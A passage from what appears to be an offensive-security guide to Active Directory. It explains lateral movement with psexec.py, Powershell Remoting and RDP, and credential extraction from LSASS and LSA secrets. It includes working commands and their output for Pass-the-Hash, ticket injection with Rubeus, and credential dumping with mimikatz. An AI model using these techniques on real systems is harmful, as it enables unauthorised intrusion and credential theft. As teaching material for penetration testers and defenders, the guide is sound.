Finally, you can also scan for other ports like 135 (<a href="#rcp">RCP</a>) or 139 (<a href="#netbios-session-service">NetBIOS
session service</a>) with nmap.</p>
</div>
</div>
<div id="outline-container-windows-computers-connection" class="outline-4">
<h4 id="windows-computers-connection">
Windows computers connection
</h4>
<div id="outline-text-windows-computers-connection" class="outline-text-4">
<p>
Once you discover other Windows machines, you may need to connect to them in
order grab credentials or data.</p>
<p>
Usually you will need to execute commands on the remote machine to perform your
actions. There are a few options to achieve this.</p>
<div id="outline-container-connecting-with-rpc-smb" class="outline-5">
<h5 id="connecting-with-rpc-smb">
Connecting with RPC/SMB
</h5>
<div id="outline-text-connecting-with-rpc-smb" class="outline-text-5">
<p>
The first and probably the most common one is to use <a href="#rpc">RPC</a> with <a href="#smb">SMB</a>. This is the
method used by many known tools such as <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a> and the impacket examples
<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py">psexec.py</a>, <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py">wmiexec.py</a> and any other *exec.py.</p>
<p>
These tools usually execute commands by using some RPC interface and
send/receive the input/output by using SMB pipes. Normally, the tools only
require the 445 port (SMB) open in order to execute commands, but some like
<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py">wmiexec.py</a> will also need the port 135 (RPC over TCP).</p>
<p>
Additionally, it is possible for these tools to perform a Pass-The-Hash by using
the NT or LM hash. The impacket tools have a parameter to use the NT or LM hash
directly, whereas in order to use it with PsExec, you must <a href="https://stealthbits.com/blog/passing-the-hash-with-mimikatz/">inject the
NT hash in the Windows session with mimikatz</a>.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ psexec.py contoso.local/Anakin@192.168.100.10 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
</span></span><span style="display:flex;"><span>Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[*] Requesting shares on 192.168.100.10.....
</span></span><span style="display:flex;"><span>[*] Found writable share ADMIN$
</span></span><span style="display:flex;"><span>[*] Uploading file WFKqIQpM.exe
</span></span><span style="display:flex;"><span>[*] Opening SVCManager on 192.168.100.10.....
</span></span><span style="display:flex;"><span>[*] Creating service AoRl on 192.168.100.10.....
</span></span><span style="display:flex;"><span>[*] Starting service AoRl.....
</span></span><span style="display:flex;"><span>[!] Press help for extra shell commands
</span></span><span style="display:flex;"><span>The system cannot find message text for message number 0x2350 in the message file for Application.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>(c) Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span>b'Not enough memory resources are available to process this command.\r\n'
</span></span><span style="display:flex;"><span>C:\Windows\system32&gt;whoami
</span></span><span style="display:flex;"><span>nt authority\system</span></span></code></pre></div>
</div>
<figcaption>
psexec.py with a NT hash
</figcaption>
</figure>
<p>
This way you are using <a href="#ntlm">NTLM</a> as authentication mechanism, which may not the best
option since in Active Directory, <a href="#kerberos">Kerberos</a> is used by default.</p>
<p>
To use Kerberos you need to provide a Kerberos ticket to the mentioned tools. In
the case of impacket, you can <a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#using-ticket-in-linux">set a ccache file to being used by impacket</a>,
whereas in Windows you will need to <a href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#using-ticket-in-windows">inject the ticket in the session</a> by using
<a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a> or <a href="https://github.com/GhostPack/Rubeus">Rubeus</a>.</p>
<p>
In order to get a Kerberos ticket to use, you can request one by using the user
password, the NT hash (Overpass-the-Hash) or the Kerberos keys (Pass-The-Key) or
you can simply steal a ticket from a <a href="#lsass-credentials">Windows</a> or <a href="#linux-kerberos-tickets">Linux</a> machine and use it
(Pass-The-Ticket).  </p>
<p>
You should take into account that Windows and Linux machines (and the tools
oriented to them) use different ticket file formats so you may have problems
moving Linux tickets to a Windows machine or vice versa. You can convert the
tickets between the different formats by using <a href="https://github.com/Zer1t0/ticket_converter">ticket_converter</a> or <a href="https://github.com/Zer1t0/cerbero#convert">cerbero</a>. </p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ getTGT.py contoso.local/Anakin -dc-ip 192.168.100.2 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
</span></span><span style="display:flex;"><span>Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[*] Saving ticket in Anakin.ccache
</span></span><span style="display:flex;"><span>$ export KRB5CCNAME=$(pwd)/Anakin.ccache
</span></span><span style="display:flex;"><span>$ psexec.py contoso.local/Anakin@WS01-10 -target-ip 192.168.100.10 -k -no-pass
</span></span><span style="display:flex;"><span>Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[*] Requesting shares on 192.168.100.10.....
</span></span><span style="display:flex;"><span>[*] Found writable share ADMIN$
</span></span><span style="display:flex;"><span>[*] Uploading file TwIEeeqd.exe
</span></span><span style="display:flex;"><span>[*] Opening SVCManager on 192.168.100.10.....
</span></span><span style="display:flex;"><span>[*] Creating service ZQZb on 192.168.100.10.....
</span></span><span style="display:flex;"><span>[*] Starting service ZQZb.....
</span></span><span style="display:flex;"><span>[!] Press help for extra shell commands
</span></span><span style="display:flex;"><span>The system cannot find message text for message number 0x2350 in the message file for Application.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>(c) Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span>b'Not enough memory resources are available to process this command.\r\n'
</span></span><span style="display:flex;"><span>C:\Windows\system32&gt;</span></span></code></pre></div>
</div>
<figcaption>
psexec.py with Kerberos authentication
</figcaption>
</figure>
<p>
When using Kerberos authentication you will need to pass as target to the tools
the hostname (DNS name or NetBIOS name) of the remote machine instead of its IP.
This is cause Kerberos authentication uses the hostname to identify the <a href="#services">service</a>
of the remote machine and provide the right ticket to authenticate against it.</p>
<p>
If you use the IP address you will get the following error:</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ psexec.py contoso.local/Anakin@192.168.100.10 -k -no-pass
</span></span><span style="display:flex;"><span>Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)</span></span></code></pre></div>
</div>
<figcaption>
Using IP address with Kerberos authentication
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-connecting-with-powershell-remoting" class="outline-5">
<h5 id="connecting-with-powershell-remoting">
Connecting with Powershell Remoting
</h5>
<div id="outline-text-connecting-with-powershell-remoting" class="outline-text-5">
<p>
An alternative to RPC/SMB to connect to a Windows machine is <a href="#powershell-remoting">Powershell
Remoting</a>, that will allow you to get a Powershell session in the remote machine.
The Powershell remoting service listens in the port 5985 and is enabled by
default in the Windows Server machines.</p>
<p>
You can use Powershell Remoting from Windows by using many <a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.1">CmdLets and
parameters</a> available in Powershell. From a Linux machine you can use <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a>.</p>
<p>
As well as in the RPC/SMB case, you can use a password, a NT hash or a Kerberos
ticket to connect to the target machine. With evil-winrm, you can pass them to
the application as a parameters or configure the ccache file as in impacket. In
case of the Powershell cmdlets, you can use a password directly, but if you have
a Kerberos ticket or a NT hash, you will need to inject them by using <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> or
<a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\&gt; .\Rubeus.exe asktgt /user<span style="color:#960050;background-color:#1e0010">:</span>Administrator /rc4<span style="color:#960050;background-color:#1e0010">:</span>b73fdfe10e87b4ca5c0d957f81de6863 /ptt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   ______        _
</span></span><span style="display:flex;"><span>  (_____ \      | |
</span></span><span style="display:flex;"><span>   _____) )_   _| |__  _____ _   _  ___
</span></span><span style="display:flex;"><span>  |  __  /| | | |  _ \| ___ | | | |/___)
</span></span><span style="display:flex;"><span>  | |  \ \| |_| | |_) ) ____| |_| |___ |
</span></span><span style="display:flex;"><span>  |_|   |_|____/|____/|_____)____/(___/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  v1.6.1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[*] Action<span style="color:#960050;background-color:#1e0010">:</span> Ask TGT
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[*] Using rc4_hmac hash<span style="color:#960050;background-color:#1e0010">:</span> b73fdfe10e87b4ca5c0d957f81de6863
</span></span><span style="display:flex;"><span>[*] Building AS-REQ (w/ preauth) <span style="color:#66d9ef">for</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#e6db74">'contoso.local\Administrator'</span>
</span></span><span style="display:flex;"><span>[+] TGT request successful!
</span></span><span style="display:flex;"><span>[*] base64(ticket.kirbi)<span style="color:#960050;background-color:#1e0010">:</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      doIFQjCCBT6gAwIBBaEDAgEWooIETzCCBEthggRHMIIEQ6ADAgEFoQ8bDUNPTlRPU08uTE9DQUyiIjAg
</span></span><span style="display:flex;"><span>      oAMCAQKhGTAXGwZrcmJ0Z3QbDWNvbnRvc28ubG9jYWyjggQFMIIEAaADAgESoQMCAQKiggPzBIID7xK3
</span></span><span style="display:flex;"><span>      &lt;!--stripped--&gt;
</span></span><span style="display:flex;"><span>      ERgPMjAyMTA1MDgwMjQzMjZapxEYDzIwMjEwNTE0MTY0MzI2WqgPGw1DT05UT1NPLkxPQ0FMqSIwIKAD
</span></span><span style="display:flex;"><span>      AgECoRkwFxsGa3JidGd0Gw1jb250b3NvLmxvY2Fs
</span></span><span style="display:flex;"><span>[+] Ticket successfully imported!
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  ServiceName           <span style="color:#960050;background-color:#1e0010">:</span>  krbtgt/contoso.local
</span></span><span style="display:flex;"><span>  ServiceRealm          <span style="color:#960050;background-color:#1e0010">:</span>  CONTOSO.LOCAL
</span></span><span style="display:flex;"><span>  UserName              <span style="color:#960050;background-color:#1e0010">:</span>  Administrator
</span></span><span style="display:flex;"><span>  UserRealm             <span style="color:#960050;background-color:#1e0010">:</span>  CONTOSO.LOCAL
</span></span><span style="display:flex;"><span>  StartTime             <span style="color:#960050;background-color:#1e0010">:</span>  <span style="color:#ae81ff">07</span>/<span style="color:#ae81ff">05</span>/<span style="color:#ae81ff">2021</span> <span style="color:#ae81ff">18</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">43</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">26</span>
</span></span><span style="display:flex;"><span>  EndTime               <span style="color:#960050;background-color:#1e0010">:</span>  <span style="color:#ae81ff">08</span>/<span style="color:#ae81ff">05</span>/<span style="color:#ae81ff">2021</span> <span style="color:#ae81ff">04</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">43</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">26</span>
</span></span><span style="display:flex;"><span>  RenewTill             <span style="color:#960050;background-color:#1e0010">:</span>  <span style="color:#ae81ff">14</span>/<span style="color:#ae81ff">05</span>/<span style="color:#ae81ff">2021</span> <span style="color:#ae81ff">18</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">43</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">26</span>
</span></span><span style="display:flex;"><span>  Flags                 <span style="color:#960050;background-color:#1e0010">:</span>  name_canonicalize, pre_authent, initial, renewable, forwardable
</span></span><span style="display:flex;"><span>  KeyType               <span style="color:#960050;background-color:#1e0010">:</span>  rc4_hmac
</span></span><span style="display:flex;"><span>  Base64(key)           <span style="color:#960050;background-color:#1e0010">:</span>  95a1NmgYXwOmiyCa3qlplA==
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PS C:\&gt; Enter-PSSession -ComputerName dc01
</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">dc01</span>]<span style="color:#960050;background-color:#1e0010">:</span> PS C:\Users\Administrator\Documents&gt; whoami
</span></span><span style="display:flex;"><span>contoso\administrator
</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">dc01</span>]<span style="color:#960050;background-color:#1e0010">:</span> PS C:\Users\Administrator\Documents&gt; hostname
</span></span><span style="display:flex;"><span>dc01
</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">dc01</span>]<span style="color:#960050;background-color:#1e0010">:</span></span></span></code></pre></div>
</div>
<figcaption>
Using Powershell Remoting with Overpass-the-Hash
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-connecting-with-rdp" class="outline-5">
<h5 id="connecting-with-rdp">
Connecting with RDP
</h5>
<div id="outline-text-connecting-with-rdp" class="outline-text-5">
<p>
One common method to connect to a remote machine in Windows is <a href="#rdp">RDP</a> (Remote
Desktop Protocol). You can use RDP from a Windows machine by using the default
client "Remote Desktop Connection" (<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc">mstsc</a>). From Linux there are excellent clients
like <a href="http://www.rdesktop.org/">rdesktop</a>, <a href="https://www.freerdp.com/">freerdp</a> or <a href="https://remmina.org/">remmina</a>.</p>
<p>
Unlike RPC/SMB and Powershell Remoting, RDP transmits the plain user password to the
target computer in order to cache the credentials and facilitate SSO (Single
Sign On), as if the user was logged on its physical machine. Due to this to use
RDP you are required to use the user password and it is not possible to perform
a Pass-The-Hash… by default.</p>
<p>
As we have mentioned, when connection through RDP <a href="#remoteinteractive-logon">the credentials are cached in
the target machine</a>, susceptible to being stolen from the lsass process with
tools like mimikatz. The credentials are cached in order to being reused to
network connections from the target machine, but sometimes this is unnecessary,
so in <a href="https://docs.microsoft.com/en-us/archive/blogs/kfalde/restricted-admin-mode-for-rdp-in-windows-8-1-2012-r2">Windows 8.1 / 2012 R2 Microsoft introduced the Restricted Admin mode for
RPD</a>. When Restricted Admin mode is enabled you don't send the plain credentials,
so it is possible to perform a Pass-The-Hash/Key/Ticket to establish an RDP
connection.</p>
<p>
From Linux, you can <a href="https://www.kali.org/blog/passing-hash-remote-desktop/">use freerdp to perform a Pass-The-Hash with RDP</a> (you need to
install the <code class="verbatim">freerdp2-x11</code> <code class="verbatim">freerdp2-shadow-x11</code> packages instead of
<code class="verbatim">freerdp-x11</code> as the article said). You only need to provide the NT hash instead
of the password.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>xfreerdp /u:Anakin@contoso.local /pth:cdeae556dc28c24b5b7b14e9df5b6e21 /v:192.168.122.143</span></span></code></pre></div>
</div>
<figcaption>
Pass-The-Hash with freerdp
</figcaption>
</figure>
<p>
On the other hand, from Windows you can <a href="https://shellz.club/pass-the-hash-with-rdp-in-2019/">inject a NT hash or
Kerberos ticket with mimikatz or Rubeus and then use <code>mstsc.exe
/restrictedadmin</code></a> to establish a RDP connection without requiring the user
password.</p>
<figure>
<img src="./rdp_restrictedadmin.png" alt="./rdp_restrictedadmin.png" title="./rdp_restrictedadmin.png"><figcaption>
Restricted Admin is enabled
</figcaption>
</figure>
<figure>
<img src="./rdp_no_restrictedadmin.png" alt="./rdp_no_restrictedadmin.png" title="./rdp_no_restrictedadmin.png"><figcaption>
Restricted Admin is not enabled
</figcaption>
</figure>
</div>
</div>
</div>
</div>
<div id="outline-container-windows-computers-credentials" class="outline-4">
<h4 id="windows-computers-credentials">
Windows computers credentials
</h4>
<div id="outline-text-windows-computers-credentials" class="outline-text-4">
<div id="outline-container-lsass-credentials" class="outline-5">
<h5 id="lsass-credentials">
LSASS credentials
</h5>
<div id="outline-text-lsass-credentials" class="outline-text-5">
<p>
 In a Windows machine, a common place to find credentials is the LSASS (Local
 Security Authority Subsystem Service) process (<code class="verbatim">lsass.exe</code>). The LSASS process
 is on charge of manage the security related operations of the computer,
 including users authentication.</p>
<p>
 When an user performs an <a href="https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/windows-logon-scenarios#BKMK_InteractiveLogon">interactive logon</a> in the computer, by accessing
 physically to the computer or through <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255(v=ws.11)?redirectedfrom=MSDN#remote-desktop-users">RDP</a>, the user credentials get cached in
 the LSASS process in order to use SSO (Single Sign-On) when <a href="https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/windows-logon-scenarios#BKMK_NetworkLogon">network logon</a> 
 will be required to access to other domain computers.</p>
<blockquote>
<p>Be aware that remote users authenticated through <a href="#ntlm">NTLM</a> or <a href="#Kerberos">Kerberos</a> will not let
 cached credentials in the computer (in the lsass process), since those
 protocols don't really sent the user credentials to the computer (except if
 Kerberos delegation is enabled), but a proof, that can be either a NTLM hash or
 Kerberos ticket generated with the credentials.</p>
<p>
 In summary, you cannot extract from lsass (with mimikatz) the credentials of
 remote users authenticated with NTLM or Kerberos. (Unless the protocol/service
 sends them explicitly after authentication, as RDP does, but this has nothing to
 do with NTLM or Kerberos)</p>
</blockquote>
<p>
 The credentials are cached by some of the <a href="#windows-ssps">SSPs</a> (Security Support Providers) that
 are used by LSASS in order to provide different authentication methods. Some
 SSPs are the following:</p>
<ul>
<li>The <a href="#kerberos-ssp">Kerberos SSP</a> manages the Kerberos authentication and is responsible to
store the tickets and Kerberos keys for the current logged users.</li>
<li>The <a href="#ntlm-ssp">NTLMSSP</a> or MSV SSP handles the NTLM authentication and is responsible for
storing the NT hashes for the current logged users. It will not cache the
credentials used </li>
<li>The <a href="#digest-ssp">Digest SSP</a> implements the Digest Access protocol, used by HTTP
applications. This is the SSP that stores the cleartext user password in
order to calculate the digest.

Even if the password caching is disabled by default since Windows 2008 R2, it
is still possible to enable the password caching by setting the
<code class="verbatim">HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential</code>
registry entry to 1 or <a href="https://blog.xpnsec.com/exploring-mimikatz-part-1/">patching the Digest SSP</a> directly in memory.</li>
</ul>
<p>Therefore, if we are able to access to the LSASS process memory, for which the
 <strong>SeDebugPrivilege is required</strong> (usually hold by administrators) since lsass is
 system process, we can retrieve the cached credentials. As we have seen, these
 cached credentials include the <a href="#lm-nt-hashes">NT hash</a> of the user, the <a href="#kerberos-keys">Kerberos keys</a> and
 tickets, and even the user password in plaintext in some old or misconfigured
 machines.</p>
<p>
 The common way to extract the credentials from LSASS process is by using
 <a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>. We can launch mimikatz directly in the target machine, or <a href="https://www.deepinstinct.com/2021/01/24/lsass-memory-dumps-are-stealthier-than-ever-before/">dumping the
 LSASS memory</a> with some tool like <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">procdump</a>, <a href="https://lolbas-project.github.io/lolbas/Libraries/Comsvcs/">comsvcs.dll</a> or <a href="https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/">werfault.exe</a> and then
 process the generated memory dump with mimikatz or <a href="https://github.com/skelsec/pypykatz">pypikatz</a>. It is possible also
 to use <a href="https://github.com/Hackndo/lsassy">lsassy</a> to read a dump remotely avoiding to have to download the entire
 memory dump, that can take several megabytes.</p>
<p>
 To extract credentials with mimikatz, there are a few commands you should know.
 They will retry different secrets from the logged users:</p>
<ul>
<li><code class="verbatim">sekurlsa::logonpasswords</code>: Extracts the NT hashes and passwords.</li>
<li><code class="verbatim">sekurlsa::ekeys</code>: Gets the Kerberos keys.</li>
<li><code class="verbatim">sekurlsa::tickets</code>: Retrieves the Kerberos tickets stored in the machine.</li>
</ul>
<p>Specifically, in order to access to LSASS process memory, you need the
 <a href="https://devblogs.microsoft.com/oldnewthing/20080314-00/?p=23113">SeDebugPrivilege</a>, that allows the user to debug processes of other users.
 Usually only the administrators have this privilege (but if another user gets
 this privilege she can become administrator).</p>
<p>
 Moreover, <strong>SeDebugPrivilege must be enabled</strong> in the process that tries to
 dump the LSASS memory. By default is enabled in Powershell and disabled in CMD
 (and therefore in their child processes). If you are launching mimikatz, you can
 enable it by using the <code>privilege::debug</code> command. In other case you can launch
 the process with Powershell using <code>powershell.exe &lt;command&gt;</code>, or using some tool
 like <a href="https://github.com/Zer1t0/sepriv">sepriv</a> to enable it in CMD.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>C:\&gt;.\mimikatz.exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
</span></span><span style="display:flex;"><span> .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
</span></span><span style="display:flex;"><span> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
</span></span><span style="display:flex;"><span> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
</span></span><span style="display:flex;"><span> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
</span></span><span style="display:flex;"><span>  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mimikatz # sekurlsa::logonpasswords
</span></span><span style="display:flex;"><span>ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mimikatz # privilege::debug
</span></span><span style="display:flex;"><span>Privilege '20' OK
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mimikatz # sekurlsa::logonpasswords
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Authentication Id : 0 ; 629376 (00000000:00099a80)
</span></span><span style="display:flex;"><span>Session           : Interactive from 1
</span></span><span style="display:flex;"><span>User Name         : Administrator
</span></span><span style="display:flex;"><span>Domain            : CONTOSO
</span></span><span style="display:flex;"><span>Logon Server      : DC01
</span></span><span style="display:flex;"><span>Logon Time        : 03/05/2021 12:34:17
</span></span><span style="display:flex;"><span>SID               : S-1-5-21-1372086773-2238746523-2939299801-500
</span></span><span style="display:flex;"><span>        msv :
</span></span><span style="display:flex;"><span>         [00000003] Primary
</span></span><span style="display:flex;"><span>         * Username : Administrator
</span></span><span style="display:flex;"><span>         * Domain   : CONTOSO
</span></span><span style="display:flex;"><span>         * NTLM     : b73fdfe10e87b4ca5c0d957f81de6863
</span></span><span style="display:flex;"><span>         * SHA1     : 88cbc713492c32909ee5deddee08c7e31c70d716
</span></span><span style="display:flex;"><span>         * DPAPI    : 0c1e1d360ebc8f790ff9577fcdb60d75
</span></span><span style="display:flex;"><span>        tspkg :
</span></span><span style="display:flex;"><span>        wdigest :
</span></span><span style="display:flex;"><span>         * Username : Administrator
</span></span><span style="display:flex;"><span>         * Domain   : CONTOSO
</span></span><span style="display:flex;"><span>         * Password : (null)
</span></span><span style="display:flex;"><span>        kerberos :
</span></span><span style="display:flex;"><span>         * Username : Administrator
</span></span><span style="display:flex;"><span>         * Domain   : CONTOSO.LOCAL
</span></span><span style="display:flex;"><span>         * Password : (null)
</span></span><span style="display:flex;"><span>        ssp :
</span></span><span style="display:flex;"><span>        credman :
</span></span><span style="display:flex;"><span>        cloudap :</span></span></code></pre></div>
</div>
<figcaption>
Dump credentials with mimikatz
</figcaption>
</figure>
<p>
 Notwithstanding, you should be aware that LSASS can be protected against
 credential extraction.This could be achieved by <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-how-it-works">Credential Guard</a>, that uses the
 hypervisor technology to store the credentials in a safer place outside of the
 operative system. However <a href="https://teamhydra.blog/2020/08/25/bypassing-credential-guard/">Credential Guard can be bypassed</a>.</p>
<p>
 Additionally, lsass.exe can be configured to run as a PPL (Protected Process
 Light). Even if this makes more difficult the credentials extraction,
 it <a href="https://www.redcursor.com.au/blog/bypassing-lsa-protection-aka-protected-process-light-without-mimikatz-on-windows-10">can be disabled</a>.</p>
</div>
</div>
<div id="outline-container-registry credentials" class="outline-5">
<h5 id="registry credentials">
Registry credentials
</h5>
<div id="outline-text-registry credentials" class="outline-text-5">
<div id="outline-container-lsa-secrets" class="outline-6">
<h6 id="lsa-secrets">
LSA secrets
</h6>
<div id="outline-text-lsa-secrets" class="outline-text-6">
<p>
 Other location to find credentials is the registry. In the registry the
 computer stores some credentials required in order to work properly. One of the
 places where sensible credentials are stored is in the <a href="https://passcape.com/index.php?section=docsys&amp;cmd=details&amp;id=23">LSA secrets</a>.</p>
<p>
 The LSA secrets is an special storage located in the registry which is used to
 save sensible data that is only accessible for the <code class="verbatim">SYSTEM</code> local account. In
 the disk, the LSA secrets are saved in the SECURITY <a href="https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-hives">hive</a> file, that is encrypted
 with the BootKey/SysKey (stored in the SYSTEM hive file).</p>
<figure>
<div class="src src-cmd">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>PS C:\&gt; whoami
</span></span><span style="display:flex;"><span>nt authority\system
</span></span><span style="display:flex;"><span>PS C:\&gt; reg query HKLM\SECURITY\Policy\Secrets
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets
</span></span><span style="display:flex;"><span>    (Default)    REG_NONE
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\$MACHINE.ACC
</span></span><span style="display:flex;"><span>HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DefaultPassword
</span></span><span style="display:flex;"><span>HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM
</span></span><span style="display:flex;"><span>HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\NL$KM
</span></span><span style="display:flex;"><span>HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\_SC_mysql</span></span></code></pre></div>
</div>
<figcaption>
LSA Secrets keys
</figcaption>
</figure>
<p>
 In the LSA secrets you can find:</p>
<dl>
<dt>
Domain Computer Account
</dt>
<dd>In order to work as part of the domain,
the computer needs an user account in the domain. Therefore, the username and
password of this computer account needs to be available to the operating
system, so they are stored in the LSA secrets. Also, you have to know that the
computer password is <a href="https://adsecurity.org/?p=280">changed every 30 days by default</a>. This computer account
is used by the <code class="verbatim">SYSTEM</code> local account to interact with the domain, but not
locally, thus, this account has no administrative privileges in the machine.

However, even if the computer domain account has no administrative
privileges, you can use it to create a <a href="#golden-silver-ticket">Silver ticket</a> or perform a
<a href="#s4u-attacks">RBCD attack</a> to get access to the machine as an administrator.</dd>
<dt>
Service users passwords
</dt>
<dd>In order to run services on behalf of an user, the
computer needs to store its password. However, the user of the password is not
stored, but the service name, so you may need to investigate what is the
username.</dd>
<dt>
Auto-logon password
</dt>
<dd>If windows <a href="https://keithga.wordpress.com/2013/12/19/sysinternals-autologon-and-securely-encrypting-passwords/">auto-logon is enabled</a>, the password can
be stored in the LSA secrets. The other alternative is that it is saved in
<code class="verbatim">HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code>
registry key under the key <code class="verbatim">DefaulUserName</code>. The domain and username are
always stored in <code class="verbatim">DefaultDomainName</code> and <code class="verbatim">DefaultUserName</code>, respectively.</dd>
<dt>
DPAPI master keys
</dt>
<dd>The <a href="https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection">data protection API</a> (DPAPI) is used to allow users
encrypt sensible data without need to worry about cryptographic keys. If you
are able to retrieve the master keys, then you <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dpapi-extracting-passwords">can decrypt users data</a>.</dd>
</dl>
<p>
 Moreover, in the SECURITY hive file, there are also stored the credentials from
 the last <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/cached-domain-logon-information">domain users logged in the machine</a>, known as the Domain cached
 credentials (DCC). Thus, the computer can authenticate the domain user even if
 the connection with the domain controllers is lost. This cached credentials are
 MSCACHEV2/MSCASH hashes, different from the NT hashes, so they cannot be used to
